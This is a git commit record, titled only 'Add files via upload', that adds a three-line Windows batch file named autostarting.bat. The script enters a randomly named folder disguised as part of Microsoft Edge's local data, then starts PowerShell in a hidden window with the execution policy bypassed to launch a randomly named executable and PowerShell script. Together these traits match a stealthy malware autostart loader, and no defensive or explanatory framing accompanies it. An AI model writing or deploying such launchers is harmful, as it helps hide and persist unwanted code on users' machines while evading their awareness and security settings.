39e0e1dd183aa9f037d7d9400e8a05144a0baede
Mirozo <82079025+MirozoPL@users.noreply.github.com>
2022-12-11 21:22:14 +0100

    Add files via upload

---
+++ autostarting.bat
@@ -0,0 +1,3 @@
+@ECHO OFF
+cd %userprofile%\AppData\Local\MicrosoftEdge\404eb8b50ea0d5d6
+start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'ygoLa8SyqmQTGsoh.exe';.\LhFDtKhHgdiXDSt3.ps1
